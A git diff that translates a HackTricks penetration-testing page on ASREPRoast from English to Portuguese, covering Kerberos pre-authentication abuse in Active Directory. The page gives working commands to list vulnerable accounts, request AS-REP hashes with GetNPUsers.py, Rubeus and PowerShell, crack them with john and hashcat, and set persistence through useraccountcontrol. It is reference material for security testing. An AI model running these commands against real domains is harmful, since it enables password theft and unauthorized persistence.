@@ -1,53 +1,25 @@
-# ASREPRoast
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
-
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
-
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
-
-🐞 Read web3 bug tutorials
-
-🔔 Get notified about new bug bounties
-
-💬 Participate in community discussions
-
 ## ASREPRoast
 
-The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
+O ataque ASREPRoast procura por usuários sem o atributo de pré-autenticação Kerberos necessário (_**DONT_REQ_PREAUTH**_).
 
-That means that anyone can send an AS\_REQ request to the DC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
+Isso significa que qualquer pessoa pode enviar uma solicitação AS_REQ para o DC em nome de qualquer um desses usuários e receber uma mensagem AS_REP. Esse último tipo de mensagem contém um pedaço de dados criptografados com a chave de usuário original, derivada de sua senha. Em seguida, usando essa mensagem, a senha do usuário pode ser quebrada offline.
 
-Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain. **Otherwise usernames have to be guessed**.
+Além disso, **não é necessário ter uma conta de domínio para realizar esse ataque**, apenas conexão com o DC. No entanto, **com uma conta de domínio**, uma consulta LDAP pode ser usada para **recuperar usuários sem pré-autenticação Kerberos** no domínio. **Caso contrário, os nomes de usuário devem ser adivinhados**.
 
-#### Enumerating vulnerable users (need domain credentials)
-
+#### Enumerando usuários vulneráveis (necessita de credenciais de domínio)
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
+#### Solicitação de mensagem AS_REP
 
-#### Request AS\_REP message
-
-{% code title="Using Linux" %}
+{% code title="Usando Linux" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
-{% endcode %}
-
-{% code title="Using Windows" %}
+{% code title="Usando o Windows" %}
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
@@ -55,46 +27,42 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+O AS-REP Roasting com o Rubeus irá gerar um 4768 com um tipo de criptografia de 0x17 e um tipo de pré-autenticação de 0.
 {% endhint %}
 
-### Cracking
-
+### Quebrando
 ```
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 ```
+### Persistência
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
+Forçar a não exigência de **preauth** para um usuário onde você tem permissões de **GenericAll** (ou permissões para escrever propriedades):
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
+## Referências
 
-## References
-
-[**More information about AS-RRP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+[**Mais informações sobre AS-RRP Roasting em ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
 <figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**
 
-🐞 Read web3 bug tutorials
+🐞 Leia tutoriais de bugs web3
 
-🔔 Get notified about new bug bounties
+🔔 Receba notificações sobre novas recompensas por bugs
 
-💬 Participate in community discussions
+💬 Participe de discussões na comunidade
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
